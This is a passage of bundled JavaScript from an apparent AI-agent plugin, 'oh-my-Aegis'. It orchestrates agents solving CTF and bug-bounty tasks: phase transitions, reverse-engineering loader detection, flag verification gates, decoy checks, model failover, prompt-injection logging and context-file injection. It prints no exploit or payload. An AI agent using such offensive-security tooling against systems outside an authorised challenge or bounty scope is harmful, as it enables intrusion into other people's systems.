          }
        }
        if (input.tool === "task") {
          const stateForPlan = store.get(input.sessionID);
          const lastBase = baseAgentName(stateForPlan.lastTaskCategory || "");
          if (lastBase === "aegis-plan" && typeof originalOutput === "string" && originalOutput.trim().length > 0) {
            safeNoteWrite("plan.snapshot", () => {
              const root = notesStore.getRootDirectory();
              const planPath = join17(root, "PLAN.md");
              const content = [
                "# PLAN",
                `updated_at: ${new Date().toISOString()}`,
                `session_id: ${input.sessionID}`,
                "",
                originalOutput.trimEnd(),
                ""
              ].join(`
`);
              writeFileSync6(planPath, content, "utf-8");
              notesStore.recordScan(`Plan snapshot updated: ${relative5(ctx.directory, planPath)}`);
            });
          }
        }
        if (config3.auto_phase.enabled) {
          const apState = store.get(input.sessionID);
          const hasNonEmptyToolOutput = typeof originalOutput === "string" && originalOutput.trim().length > 0 || textFromUnknown(originalOutput).trim().length > 0;
          const isScanEvidenceFromAutoTriage = input.tool === "ctf_auto_triage" && hasNonEmptyToolOutput;
          const bashCommandFromMetadata = extractBashCommand(input.metadata);
          const bashCommandFromArgs = extractBashCommand(input.args);
          const bashCommand = bashCommandFromMetadata || bashCommandFromArgs;
          const isScanEvidenceFromBash = input.tool === "bash" && hasNonEmptyToolOutput && /\b(file|strings|readelf|checksec)\b/i.test(bashCommand);
          const hasScanEvidence = isScanEvidenceFromAutoTriage || isScanEvidenceFromBash;
          const scanFallbackReached = apState.toolCallCount >= config3.auto_phase.scan_to_plan_tool_count;
          if (apState.phase === "SCAN" && (hasScanEvidence || scanFallbackReached)) {
            store.applyEvent(input.sessionID, "scan_completed");
            metricSignals.push("auto_phase:scan_to_plan");
          } else if (apState.phase === "PLAN" && config3.auto_phase.plan_to_execute_on_todo && input.tool === "todowrite") {
            const todowritePayloadCandidates = [
              input.args,
              input.metadata,
              output.metadata
            ];
            const hasInProgressTodo = todowritePayloadCandidates.some((candidate) => {
              if (!isRecord(candidate)) {
                return false;
              }
              if (Array.isArray(candidate.todos)) {
                return inProgressTodoCount(candidate) > 0;
              }
              if (!isRecord(candidate.args) || !Array.isArray(candidate.args.todos)) {
                return false;
              }
              return inProgressTodoCount(candidate.args) > 0;
            });
            if (hasInProgressTodo) {
              store.applyEvent(input.sessionID, "plan_completed");
              metricSignals.push("auto_phase:plan_to_execute");
            }
          }
        }
        if (config3.enable_injection_logging && notesReady) {
          const indicators = detectInjectionIndicators(raw);
          if (indicators.length > 0) {
            safeNoteWrite("tool.execute.after.injection", () => {
              notesStore.recordInjectionAttempt(`tool.${input.tool}`, indicators, raw);
            });
            notesStore.flushNow();
          }
        }
        if (isContextLengthFailure(raw)) {
          store.applyEvent(input.sessionID, "context_length_exceeded");
          metricSignals.push("context_length_exceeded");
          maybeAutoCompactNotes(input.sessionID, "context_length_exceeded");
          await maybeShowToast({
            sessionID: input.sessionID,
            key: "context_length_exceeded",
            title: "oh-my-Aegis: context overflow",
            message: "Context length failure detected. Auto-compaction attempted.",
            variant: "warning"
          });
          await contextWindowRecoveryManager.handleContextFailureText(input.sessionID, raw);
        }
        if (isLikelyTimeout(raw)) {
          store.applyEvent(input.sessionID, "timeout");
          metricSignals.push("timeout");
        }
        const stateBeforeVerifyCheck = store.get(input.sessionID);
        const lastRouteBase = baseAgentName(stateBeforeVerifyCheck.lastTaskRoute || "");
        const contradictionArtifactRoutes = new Set([
          "ctf-web",
          "ctf-web3",
          "ctf-pwn",
          "ctf-rev",
          "ctf-crypto",
          "ctf-forensics",
          "ctf-explore",
          "ctf-research",
          "bounty-triage",
          "bounty-research"
        ]);
        const artifactHints = extractArtifactPathHints(raw);
        const filteredArtifactHints = artifactHints.filter((hint) => {
          if (hint.includes("/.Aegis/") || hint.startsWith(".Aegis/") || hint.startsWith("./.Aegis/")) {
            return true;
          }
          return /^\/tmp\/[A-Za-z0-9._-]+\.(?:out|bin|elf|dump|log|json)$/.test(hint);
        });
        if ((input.tool === "task" || input.tool === "bash") && stateBeforeVerifyCheck.contradictionArtifactLockActive && !stateBeforeVerifyCheck.contradictionPatchDumpDone && contradictionArtifactRoutes.has(lastRouteBase) && filteredArtifactHints.length > 0) {
          store.recordContradictionArtifacts(input.sessionID, filteredArtifactHints);
          metricSignals.push("contradiction_artifacts_recorded");
          metricExtras.contradictionArtifactsRecorded = filteredArtifactHints;
          safeNoteWrite("contradiction.artifact", () => {
            notesStore.recordScan(`Contradiction artifact lock released: recorded artifact paths ${filteredArtifactHints.join(", ")}`);
          });
        }
        const routeVerifier = input.tool === "task" && (lastRouteBase === "ctf-verify" || lastRouteBase === "ctf-decoy-check");
        const verificationRelevant = routeVerifier || isVerificationSourceRelevant(input.tool, output.title, {
          verifierToolNames: config3.verification.verifier_tool_names,
          verifierTitleMarkers: config3.verification.verifier_title_markers
        });
        const parsedOracleProgress = verificationRelevant || raw.includes("ORACLE_PROGRESS") ? parseOracleProgressFromText(raw) : null;
        if (stateBeforeVerifyCheck.targetType === "REV" && input.tool === "bash") {
          const bashCommand = extractBashCommand(input.metadata);
          const revDetectorCommand = /\b(strings|readelf|checksec)\b/i;
          if (revDetectorCommand.test(bashCommand)) {
            const commandLower = bashCommand.toLowerCase();
            const stringsOutput = /\bstrings\b/.test(commandLower) ? raw : "";
            const readelfOutput = /\breadelf\b/.test(commandLower) ? raw : "";
            const readelfSections = /\breadelf\b/.test(commandLower) && /(?:^|\s)-S(?:\s|$)/.test(bashCommand) ? raw : readelfOutput;
            const readelfRelocs = /\breadelf\b/.test(commandLower) && /(?:^|\s)-r(?:\s|$)/.test(bashCommand) ? raw : readelfOutput;
            const revRisk = assessRevVmRisk(raw);
            if (revRisk.signals.length > 0) {
              store.setRevRisk(input.sessionID, revRisk);
              appendOrchestrationLedgerFromRuntime(input.sessionID, "rev_vm_detect", "static_reverse", Math.max(0, Math.min(1, revRisk.score)), `REV VM risk signals: ${revRisk.signals.join(", ")}`, "tool.execute.after");
            }
            const indicator = detectRevLoaderVm(readelfSections, readelfRelocs, stringsOutput);
            const forcedByDetector = shouldForceRelocPatchDump(indicator);
            const forcedByRelocMemfd = /(?:\.rela\.p|\.sym\.p)/i.test(raw) && /(?:memfd_create|fexecve)/i.test(raw);
            const forcedBySignalCount = indicator.signals.length >= 3;
            const forceExtractionFirst = forcedByDetector || forcedByRelocMemfd || forcedBySignalCount;
            if (forceExtractionFirst) {
              const stateForTransition = store.get(input.sessionID);
              const needsTransition = !stateForTransition.revVmSuspected || !stateForTransition.revLoaderVmDetected || stateForTransition.revStaticTrust !== 0 || !stateForTransition.contradictionArtifactLockActive || stateForTransition.contradictionPivotDebt < 2 || !stateForTransition.contradictionSLADumpRequired;
              if (needsTransition) {
                store.update(input.sessionID, {
                  revVmSuspected: true,
                  revLoaderVmDetected: true,
                  revStaticTrust: 0,
                  contradictionArtifactLockActive: true,
                  contradictionPivotDebt: Math.max(stateForTransition.contradictionPivotDebt, 2),
                  contradictionSLADumpRequired: true
                });
                const triggerSignals = [];
                if (forcedByDetector)
                  triggerSignals.push("detector_force_reloc_patch_dump");
                if (forcedByRelocMemfd)
                  triggerSignals.push("rela_or_sym_p_with_memfd_or_fexecve");
                if (forcedBySignalCount)
                  triggerSignals.push(`signal_count=${indicator.signals.length}`);
                if (indicator.signals.length > 0)
                  triggerSignals.push(...indicator.signals.slice(0, 8));
                appendOrchestrationLedgerFromRuntime(input.sessionID, "auto_rev_vm_detected", "dynamic_memory", 0.9, `Auto REV VM detect from bash '${bashCommand}': ${triggerSignals.join(", ") || "heuristic trigger"}`, "tool.execute.after");
              }
            }
            const replayCheck = isReplayUnsafe(stringsOutput, readelfOutput);
            if (replayCheck.unsafe) {
              const tokens = bashCommand.match(/"[^"]*"|'[^']*'|\S+/g) ?? [];
              const normalizedTokens = tokens.map((token) => token.replace(/^['"]|['"]$/g, ""));
              let replayBinaryKey = "";
              for (const token of normalizedTokens) {
                if (token.startsWith("--file=")) {
                  replayBinaryKey = token.slice("--file=".length);
                  break;
                }
              }
              if (!replayBinaryKey) {
                for (let i = 1;i < normalizedTokens.length; i += 1) {
                  const token = normalizedTokens[i];
                  if (!token || token.startsWith("-")) {
                    continue;
                  }
                  replayBinaryKey = token;
                  break;
                }
              }
              if (!replayBinaryKey) {
                replayBinaryKey = bashCommand.trim() || "bash:unknown_binary";
              }
              const stateForReplay = store.get(input.sessionID);
              const knownLowTrust = stateForReplay.replayLowTrustBinaries || [];
              if (!knownLowTrust.includes(replayBinaryKey)) {
                store.update(input.sessionID, {
                  replayLowTrustBinaries: [...knownLowTrust, replayBinaryKey]
                });
                store.applyEvent(input.sessionID, "replay_low_trust");
                appendOrchestrationLedgerFromRuntime(input.sessionID, "auto_replay_low_trust", "dynamic_memory", 0.8, `Auto replay low-trust for '${replayBinaryKey}': ${replayCheck.signals.join(", ")}`, "tool.execute.after");
              }
            }
          }
        }
        if (input.tool === "ctf_oracle_progress" && typeof originalOutput === "string") {
          try {
            const parsed = JSON.parse(originalOutput);
            const progress = parsed.progress;
            if (progress) {
              const pct = typeof progress.passRate === "number" ? `${(progress.passRate * 100).toFixed(1)}%` : "unknown";
              const passCount = typeof progress.passCount === "number" ? progress.passCount : -1;
              const totalTests = typeof progress.totalTests === "number" ? progress.totalTests : -1;
              appendOrchestrationLedgerFromRuntime(input.sessionID, "oracle_progress_snapshot", "behavioral_runtime", progress.improved ? 0.85 : 0.6, `Oracle progress snapshot: passRate=${pct} pass=${passCount}/${totalTests} improved=${progress.improved === true}`, "tool.execute.after");
            }
          } catch {}
        }
        {
          const domainRisk = assessDomainRisk(stateBeforeVerifyCheck.targetType, raw);
          if (domainRisk && domainRisk.signals.length > 0) {
            const existingSignals = stateBeforeVerifyCheck.revRiskSignals || [];
            const newDomainSignals = domainRisk.signals.filter((s) => !existingSignals.includes(s));
            if (newDomainSignals.length > 0) {
              store.update(input.sessionID, {
                revRiskSignals: [...existingSignals, ...newDomainSignals],
                revRiskScore: Math.min(1, stateBeforeVerifyCheck.revRiskScore + domainRisk.score)
              });
            }
          }
        }
        if (config3.flag_detector.enabled && raw.length < 200000) {
          const earlyCandidates = scanForFlags(raw, `tool.${input.tool}`);
          if (earlyCandidates.length > 0) {
            const stateForDecoy = store.get(input.sessionID);
            if (!stateForDecoy.decoySuspect) {
              const earlyDecoyResult = checkForDecoy(earlyCandidates, false);
              if (earlyDecoyResult.isDecoySuspect) {
                store.update(input.sessionID, {
                  decoySuspect: true,
                  decoySuspectReason: earlyDecoyResult.reason
                });
                store.applyEvent(input.sessionID, "decoy_suspect");
                appendOrchestrationLedgerFromRuntime(input.sessionID, "decoy_suspect", "string_pattern", 0.75, `Early decoy suspect: ${earlyDecoyResult.reason}`, "tool.execute.after");
                metricSignals.push("early_decoy_suspect");
                await maybeShowToast({
                  sessionID: input.sessionID,
                  key: "decoy_early",
                  title: "oh-my-Aegis: decoy suspect",
                  message: `Early decoy detection: ${earlyDecoyResult.reason}`,
                  variant: "warning"
                });
              }
            }
            const stateAfterDecoyCheck = store.get(input.sessionID);
            if (earlyCandidates.length > 0 && !stateAfterDecoyCheck.candidatePendingVerification && !stateAfterDecoyCheck.decoySuspect) {
              store.applyEvent(input.sessionID, "candidate_found");
              store.setCandidate(input.sessionID, earlyCandidates[0].flag);
              metricSignals.push("early_candidate_found");
            }
          }
        }
        {
          const stuckState = store.get(input.sessionID);
          if (stuckState.toolCallCount > 0 && stuckState.toolCallCount % 15 === 0 && stuckState.aegisToolCallCount === 0 && stuckState.phase !== "SCAN") {
            store.applyEvent(input.sessionID, "no_new_evidence");
            metricSignals.push("stuck:no_aegis_tool_usage");
          }
          const last5 = stuckState.toolCallHistory.slice(-5);
          if (last5.length === 5 && new Set(last5).size === 1 && last5[0] !== stuckState.lastToolPattern) {
            store.update(input.sessionID, {
              staleToolPatternLoops: stuckState.staleToolPatternLoops + 1,
              lastToolPattern: last5[0]
            });
            metricSignals.push(`stuck:stale_pattern:${last5[0]}`);
          }
        }
        if (verificationRelevant) {
          if (isVerifyFailure(raw)) {
            const contradictionEvidence = extractVerifierEvidence(raw, stateBeforeVerifyCheck.latestCandidate);
            const contradictionDetected = stateBeforeVerifyCheck.mode === "CTF" && Boolean(contradictionEvidence);
            if (stateBeforeVerifyCheck.mode === "CTF" && contradictionEvidence) {
              const summary = raw.replace(/\s+/g, " ").trim().slice(0, 240);
              const failedRoute = stateBeforeVerifyCheck.lastTaskCategory || route(stateBeforeVerifyCheck, config3).primary;
              store.recordFailure(input.sessionID, "static_dynamic_contradiction", failedRoute, summary);
            }
            store.applyEvent(input.sessionID, "verify_fail");
            metricSignals.push("verify_fail");
            appendLedgerFromRuntime(input.sessionID, "verify_fail", contradictionDetected ? "dynamic_memory" : "behavioral_runtime", contradictionDetected ? 0.9 : 0.7, raw, "tool.execute.after");
            if (contradictionDetected) {
              store.applyEvent(input.sessionID, "static_dynamic_contradiction");
              metricSignals.push("static_dynamic_contradiction");
              const stForSLA = store.get(input.sessionID);
              const slaLoops = stForSLA.contradictionSLALoops + 1;
              store.update(input.sessionID, {
                contradictionSLALoops: slaLoops,
                contradictionSLADumpRequired: slaLoops >= 1 && !stForSLA.contradictionPatchDumpDone
              });
            }
            {
              const stForDecoy = store.get(input.sessionID);
              const flagCandidates = scanForFlags(raw, "verify_fail");
              const existingCandidates = stForDecoy.latestCandidate ? [{ flag: stForDecoy.latestCandidate, format: "", source: "candidate", confidence: "medium", timestamp: Date.now() }] : [];
              const allCandidates = [...flagCandidates, ...existingCandidates];
              const decoyCheck = checkForDecoy(allCandidates, false);
              if (decoyCheck.isDecoySuspect && !stForDecoy.decoySuspect) {
                store.update(input.sessionID, {
                  decoySuspect: true,
                  decoySuspectReason: decoyCheck.reason
                });
                store.applyEvent(input.sessionID, "decoy_suspect");
                appendOrchestrationLedgerFromRuntime(input.sessionID, "decoy_suspect", "string_pattern", 0.75, `Verifier decoy suspect: ${decoyCheck.reason}`, "tool.execute.after");
                metricSignals.push("decoy_suspect");
              }
            }
            await maybeShowToast({
              sessionID: input.sessionID,
              key: "verify_fail",
              title: "oh-my-Aegis: verify fail",
              message: "Verifier reported failure.",
              variant: "error"
            });
          } else if (isVerifySuccess(raw)) {
            const verifierEvidence = extractVerifierEvidence(raw, stateBeforeVerifyCheck.latestCandidate);
            const isCTF = stateBeforeVerifyCheck.mode === "CTF";
            const tt = stateBeforeVerifyCheck.targetType;
            const strictBinaryVerifyTarget = isCTF && (tt === "PWN" || tt === "REV");
            const oracleOk = hasVerifyOracleSuccess(raw);
            const exitCodeOk = hasExitCodeZeroEvidence(raw);
            const runtimeEvidenceOk = hasRuntimeEvidence(raw);
            const parityEvidenceOk = stateBeforeVerifyCheck.envParityChecked && stateBeforeVerifyCheck.envParityAllMatch;
            const envEvidenceOk = parityEvidenceOk || runtimeEvidenceOk;
            const httpEvidenceOk = /\b(?:HTTP\/[12]|status[:\s]*[2345]\d\d|response\s*body)/i.test(raw);
            const txEvidenceOk = /\b(?:0x[0-9a-f]{64}|transaction\s*hash|tx\s*hash|simulation\s*pass)/i.test(raw);
            const testVectorOk = /\b(?:test\s*vector|known\s*plaintext|decrypt(?:ed|ion)\s*match)/i.test(raw);
            const artifactHashOk = /\b(?:sha256|md5|hash[:\s]+[0-9a-f]{32,64}|artifact\s*(?:hash|digest))/i.test(raw);
            let domainGatePassed = true;
            if (isCTF) {
              if (tt === "PWN" || tt === "REV") {
                domainGatePassed = oracleOk && exitCodeOk && envEvidenceOk;
              } else if (tt === "WEB_API") {
                domainGatePassed = oracleOk && httpEvidenceOk;
              } else if (tt === "WEB3") {
                domainGatePassed = oracleOk && txEvidenceOk;
              } else if (tt === "CRYPTO") {
                domainGatePassed = oracleOk && testVectorOk;
              } else if (tt === "FORENSICS") {
                domainGatePassed = oracleOk && artifactHashOk;
              } else {
                domainGatePassed = oracleOk;
              }
            }
            const strictGatePassed = domainGatePassed;
            if (hasVerifierEvidence(raw, stateBeforeVerifyCheck.latestCandidate) && verifierEvidence && strictGatePassed) {
              const acceptanceOk = hasAcceptanceEvidence(raw);
              const normalizedSummary = raw.replace(/\s+/g, " ").trim().slice(0, 240);
              store.setCandidate(input.sessionID, verifierEvidence);
              store.applyEvent(input.sessionID, "verify_success");
              metricSignals.push("verify_success");
              metricExtras.verifiedEvidence = verifierEvidence;
              appendLedgerFromRuntime(input.sessionID, "verify_success", acceptanceOk ? "acceptance_oracle" : "behavioral_runtime", acceptanceOk ? 1 : 0.85, normalizedSummary, "tool.execute.after");
              if (acceptanceOk) {
                store.setVerified(input.sessionID, verifierEvidence);
                store.setAcceptanceEvidence(input.sessionID, normalizedSummary);
                store.applyEvent(input.sessionID, "submit_accepted");
                metricSignals.push("submit_accepted");
                await maybeShowToast({
                  sessionID: input.sessionID,
                  key: "verify_success",
                  title: "oh-my-Aegis: verified",
                  message: "Verifier success and acceptance evidence confirmed.",
                  variant: "success"
                });
              } else {
                metricSignals.push("submit_pending");
                await maybeShowToast({
                  sessionID: input.sessionID,
                  key: "submit_pending",
                  title: "oh-my-Aegis: submit gate pending",
                  message: "Verification passed, but acceptance oracle evidence is still required before final submit.",
                  variant: "warning"
                });
              }
            } else {
              const summary = raw.replace(/\s+/g, " ").trim().slice(0, 240);
              const isContradiction = isCTF && !domainGatePassed && hasVerifierEvidence(raw, stateBeforeVerifyCheck.latestCandidate);
              const failureReason = isContradiction ? "static_dynamic_contradiction" : "verification_mismatch";
              const taggedSummary = `verify_blocked:${failureReason} ${summary}`;
              metricSignals.push("verify_blocked");
              metricExtras.verifyBlockedReason = failureReason;
              store.setFailureDetails(input.sessionID, failureReason, stateBeforeVerifyCheck.lastTaskCategory || route(stateBeforeVerifyCheck, config3).primary, taggedSummary);
              store.applyEvent(input.sessionID, "verify_fail");
              appendLedgerFromRuntime(input.sessionID, "verify_fail", isContradiction ? "dynamic_memory" : "behavioral_runtime", isContradiction ? 0.9 : 0.65, taggedSummary, "tool.execute.after");
              if (isContradiction) {
                store.applyEvent(input.sessionID, "static_dynamic_contradiction");
                metricSignals.push("static_dynamic_contradiction");
                if (!envEvidenceOk) {
                  store.applyEvent(input.sessionID, "readonly_inconclusive");
                  metricSignals.push("readonly_inconclusive");
                }
              }
              await maybeShowToast({
                sessionID: input.sessionID,
                key: "verify_fail_no_evidence",
                title: "oh-my-Aegis: verify blocked",
                message: !domainGatePassed ? `Success marker blocked by ${tt} domain verify gate (domain-specific evidence required).` : "Success marker detected but verifier evidence was missing.",
                variant: "warning"
              });
            }
          }
        }
        if (parsedOracleProgress) {
          const stateBeforeOracleProgress = store.get(input.sessionID);
          const prev = {
            passCount: stateBeforeOracleProgress.oraclePassCount,
            failIndex: stateBeforeOracleProgress.oracleFailIndex,
            totalTests: stateBeforeOracleProgress.oracleTotalTests
          };
          const changed = parsedOracleProgress.passCount !== prev.passCount || parsedOracleProgress.failIndex !== prev.failIndex || parsedOracleProgress.totalTests !== prev.totalTests;
          if (changed) {
            const now = Date.now();
            const progress = computeOracleProgress(parsedOracleProgress, prev);
            const nextState = {
              oraclePassCount: parsedOracleProgress.passCount,
              oracleFailIndex: parsedOracleProgress.failIndex,
              oracleTotalTests: parsedOracleProgress.totalTests,
              oracleProgressUpdatedAt: now
            };
            if (progress.improved) {
              nextState.oracleProgressImprovedAt = now;
              nextState.noNewEvidenceLoops = Math.max(0, stateBeforeOracleProgress.noNewEvidenceLoops - 1);
              nextState.samePayloadLoops = Math.max(0, stateBeforeOracleProgress.samePayloadLoops - 1);
            }
            store.update(input.sessionID, nextState);
            store.applyEvent(input.sessionID, "oracle_progress");
            appendOrchestrationLedgerFromRuntime(input.sessionID, "oracle_progress", "behavioral_runtime", progress.improved ? 0.8 : 0.6, `Oracle progress parsed: pass=${progress.passCount}/${progress.totalTests} fail_index=${progress.failIndex} improved=${progress.improved}`, "tool.execute.after");
            metricSignals.push("oracle_progress");
            if (progress.improved) {
              metricSignals.push("oracle_progress_improved");
            }
            metricExtras.oracleProgress = {
              passCount: progress.passCount,
              failIndex: progress.failIndex,
              totalTests: progress.totalTests,
              improved: progress.improved,
              passRate: Number(progress.passRate.toFixed(4))
            };
          }
        }
        const classifiedFailure = classifyFailureReason(raw);
        if (classifiedFailure === "hypothesis_stall") {
          const stateForFailure = store.get(input.sessionID);
          const failedRoute = stateForFailure.lastTaskCategory || route(stateForFailure, config3).primary;
          const summary = raw.replace(/\s+/g, " ").trim().slice(0, 240);
          store.setFailureDetails(input.sessionID, classifiedFailure, failedRoute, summary);
          if (/(same payload|same_payload)/i.test(raw)) {
            store.applyEvent(input.sessionID, "same_payload_repeat");
            metricSignals.push("same_payload_repeat");
          } else {
            store.applyEvent(input.sessionID, "no_new_evidence");
            metricSignals.push("no_new_evidence");
          }
        } else if (classifiedFailure === "exploit_chain" || classifiedFailure === "environment" || classifiedFailure === "unsat_claim" || classifiedFailure === "static_dynamic_contradiction") {
          const stateForFailure = store.get(input.sessionID);
          const failedRoute = stateForFailure.lastTaskCategory || route(stateForFailure, config3).primary;
          const summary = raw.replace(/\s+/g, " ").trim().slice(0, 240);
          store.recordFailure(input.sessionID, classifiedFailure, failedRoute, summary);
          metricSignals.push(`failure:${classifiedFailure}`);
        }
        if (input.tool === "task") {
          const state = store.get(input.sessionID);
          const isRetryableFailure = isRetryableTaskFailure(raw);
          const tokenOrQuotaFailure = isTokenOrQuotaFailure(raw);
          const useModelFailover = tokenOrQuotaFailure && config3.dynamic_model.enabled && config3.dynamic_model.generate_variants;
          const isHardFailure = !isRetryableFailure && (classifiedFailure === "verification_mismatch" || classifiedFailure === "hypothesis_stall" || classifiedFailure === "unsat_claim" || classifiedFailure === "static_dynamic_contradiction" || classifiedFailure === "exploit_chain" || classifiedFailure === "environment");
          if (isRetryableFailure) {
            store.recordDispatchOutcome(input.sessionID, "retryable_failure");
          } else if (isHardFailure) {
            store.recordDispatchOutcome(input.sessionID, "hard_failure");
          } else {
            store.recordDispatchOutcome(input.sessionID, "success");
          }
          if (tokenOrQuotaFailure) {
            const lastSubagent = state.lastTaskSubagent;
            const model = state.lastTaskModel.trim().length > 0 ? state.lastTaskModel.trim() : lastSubagent ? agentModel(lastSubagent) : undefined;
            if (model) {
              store.markModelUnhealthy(input.sessionID, model, "rate_limit_or_quota");
              safeNoteWrite("model.unhealthy", () => {
                notesStore.recordScan(`Model marked unhealthy: ${model} (via ${lastSubagent}). Dynamic failover will route to alternative model.`);
              });
            }
          }
          if (isRetryableFailure && !useModelFailover && state.taskFailoverCount < config3.auto_dispatch.max_failover_retries) {
            store.triggerTaskFailover(input.sessionID);
            await maybeShowToast({
              sessionID: input.sessionID,
              key: "task_failover_armed",
              title: "oh-my-Aegis: failover armed",
              message: `Next task will use fallback agent (attempt ${state.taskFailoverCount + 1}/${config3.auto_dispatch.max_failover_retries}).`,
              variant: "warning"
            });
            safeNoteWrite("task.failover", () => {
              notesStore.recordScan(`Auto failover armed: next task call will use fallback subagent (attempt ${state.taskFailoverCount + 1}/${config3.auto_dispatch.max_failover_retries}).`);
            });
          } else if (!isRetryableFailure && (state.pendingTaskFailover || state.taskFailoverCount > 0)) {
            store.clearTaskFailover(input.sessionID);
          }
        }
        const metricState = store.get(input.sessionID);
        if (metricSignals.length > 0) {
          appendOrchestrationMetric({
            at: new Date().toISOString(),
            source: "tool.execute.after",
            sessionID: input.sessionID,
            callID: input.callID,
            tool: input.tool,
            title: output.title,
            signals: [...new Set(metricSignals)],
            mode: metricState.mode,
            phase: metricState.phase,
            targetType: metricState.targetType,
            route: metricState.lastTaskRoute || metricState.lastTaskCategory,
            subagent: metricState.lastTaskSubagent,
            model: metricState.lastTaskModel,
            variant: metricState.lastTaskVariant,
            candidate: metricState.latestCandidate,
            verified: metricState.latestVerified,
            failureReason: metricState.lastFailureReason,
            failedRoute: metricState.lastFailedRoute,
            failureSummary: metricState.lastFailureSummary,
            contradictionPivotDebt: metricState.contradictionPivotDebt,
            contradictionPatchDumpDone: metricState.contradictionPatchDumpDone,
            contradictionArtifactLockActive: metricState.contradictionArtifactLockActive,
            contradictionArtifacts: metricState.contradictionArtifacts,
            envParityChecked: metricState.envParityChecked,
            envParityAllMatch: metricState.envParityAllMatch,
            envParityRequired: metricState.envParityRequired,
            envParityRequirementReason: metricState.envParityRequirementReason,
            verifyFailCount: metricState.verifyFailCount,
            noNewEvidenceLoops: metricState.noNewEvidenceLoops,
            samePayloadLoops: metricState.samePayloadLoops,
            timeoutFailCount: metricState.timeoutFailCount,
            contextFailCount: metricState.contextFailCount,
            taskFailoverCount: metricState.taskFailoverCount,
            ...metricExtras
          });
        }
        if (input.tool === "read") {
          const entry = readContextByCallId.get(input.callID);
          if (entry) {
            readContextByCallId.delete(input.callID);
            if (config3.context_injection.enabled) {
              const rawPath = entry.filePath;
              const resolvedTarget = isAbsolute5(rawPath) ? resolve7(rawPath) : resolve7(ctx.directory, rawPath);
              const lowered = resolvedTarget.toLowerCase();
              const isContextFile = lowered.endsWith("/agents.md") || lowered.endsWith("\\agents.md") || lowered.endsWith("/readme.md") || lowered.endsWith("\\readme.md");
              if (!isContextFile && isPathInsideRoot(resolvedTarget, ctx.directory)) {
                let baseDir = resolvedTarget;
                try {
                  const st = statSync7(resolvedTarget);
                  if (st.isFile()) {
                    baseDir = dirname5(resolvedTarget);
                  }
                } catch {
                  baseDir = dirname5(resolvedTarget);
                }
                const injectedSet = injectedContextPathsFor(input.sessionID);
                const maxFiles = config3.context_injection.max_files;
                const maxPer = config3.context_injection.max_chars_per_file;
                const maxTotal = config3.context_injection.max_total_chars;
                const toInject = [];
                let current = baseDir;
                for (let depth = 0;depth < 30; depth += 1) {
                  if (!isPathInsideRoot(current, ctx.directory)) {
                    break;
                  }
                  if (config3.context_injection.inject_agents_md) {
                    const agents = join17(current, "AGENTS.md");
                    if (existsSync16(agents) && !injectedSet.has(agents) && toInject.length < maxFiles) {
                      injectedSet.add(agents);
                      toInject.push(agents);
                    }
                  }
                  if (config3.context_injection.inject_readme_md) {
                    const readme = join17(current, "README.md");
                    if (existsSync16(readme) && !injectedSet.has(readme) && toInject.length < maxFiles) {
                      injectedSet.add(readme);
                      toInject.push(readme);
                    }
                  }
                  if (toInject.length >= maxFiles) {
                    break;
                  }
                  if (resolve7(current) === resolve7(ctx.directory)) {
                    break;
                  }
                  const parent = dirname5(current);
                  if (parent === current) {
                    break;
                  }
                  current = parent;
                }
                if (toInject.length > 0) {
                  const relTarget = relative5(ctx.directory, resolvedTarget);
                  const lines = [];
                  const pushLine = (value) => {
                    lines.push(value);
                  };
                  pushLine("[oh-my-Aegis context-injector]");
                  pushLine(`read_target: ${relTarget}`);
                  pushLine("files:");
                  for (const p of toInject) {
                    pushLine(`- ${relative5(ctx.directory, p)}`);
                  }
                  pushLine("");
                  let totalChars = lines.reduce((sum, item) => sum + item.length + 1, 0);
                  for (const p of toInject) {
                    let content = "";
                    try {
                      content = readFileSync13(p, "utf-8");
                    } catch {
                      continue;
                    }
                    if (content.length > maxPer) {
                      content = `${content.slice(0, maxPer)}
...[truncated]`;
                    }
                    const rel = relative5(ctx.directory, p);
                    const block = [`--- BEGIN ${rel} ---`, content.trimEnd(), `--- END ${rel} ---`, ""].join(`
`);
                    if (totalChars + block.length + 1 > maxTotal) {
                      break;
                    }
                    totalChars += block.length + 1;
                    pushLine(block);
                  }
                  const injectedText = lines.join(`
`).trimEnd();
                  if (injectedText.length > 0) {
                    output.output = `${injectedText}

${output.output}`;
                  }
                }
              }
            }
            if (config3.rules_injector.enabled) {
              const rawPath = entry.filePath;
              const resolvedTarget = isAbsolute5(rawPath) ? resolve7(rawPath) : resolve7(ctx.directory, rawPath);
              if (isPathInsideRoot(resolvedTarget, ctx.directory)) {
                const relTarget = normalizePathForMatch(relative5(ctx.directory, resolvedTarget));
                const rules = getClaudeRules();
                const injectedSet = injectedClaudeRulePathsFor(input.sessionID);
                const maxFiles = config3.rules_injector.max_files;
                const maxPer = config3.rules_injector.max_chars_per_file;
                const maxTotal = config3.rules_injector.max_total_chars;
                const matched = rules.rules.filter((rule) => {
                  if (!rule.body)
                    return false;
                  if (injectedSet.has(rule.sourcePath))
                    return false;
                  if (rule.pathRes.length === 0)
                    return true;
                  return rule.pathRes.some((re) => re.test(relTarget));
                });
                if (matched.length > 0) {
                  const picked = [];
                  for (const rule of matched) {
                    if (picked.length >= maxFiles)
                      break;
                    injectedSet.add(rule.sourcePath);
                    picked.push(rule);
                  }
                  const lines = [];
                  const pushLine = (value) => {
                    lines.push(value);
                  };
                  pushLine("[oh-my-Aegis rules-injector]");
                  pushLine(`read_target: ${relTarget}`);
                  pushLine("rules:");
                  for (const r of picked) {
                    pushLine(`- ${r.relPath}${r.pathGlobs.length > 0 ? ` (paths=${r.pathGlobs.join(",")})` : ""}`);
                  }
                  pushLine("");
                  let totalChars = lines.reduce((sum, item) => sum + item.length + 1, 0);
                  for (const r of picked) {
                    let content = r.body;
                    if (content.length > maxPer) {
                      content = `${content.slice(0, maxPer)}
...[truncated]`;
                    }
                    const block = [`--- BEGIN ${r.relPath} ---`, content.trimEnd(), `--- END ${r.relPath} ---`, ""].join(`
`);
                    if (totalChars + block.length + 1 > maxTotal) {
                      break;
                    }
                    totalChars += block.length + 1;
                    pushLine(block);
                  }
                  const injectedText = lines.join(`
`).trimEnd();
                  if (injectedText.length > 0) {
                    output.output = `${injectedText}

${output.output}`;
                    safeNoteWrite("rules-injector", () => {
                      notesStore.recordScan(`Rules injected: count=${picked.length} target=${relTarget}`);
                    });
                  }
                }
              }
            }
          }
        }
        if (config3.comment_checker.enabled) {
          const state = store.get(input.sessionID);
          const onlyInBounty = config3.comment_checker.only_in_bounty;
          if (!onlyInBounty || state.mode === "BOUNTY") {
            const text = typeof originalOutput === "string" ? originalOutput : "";
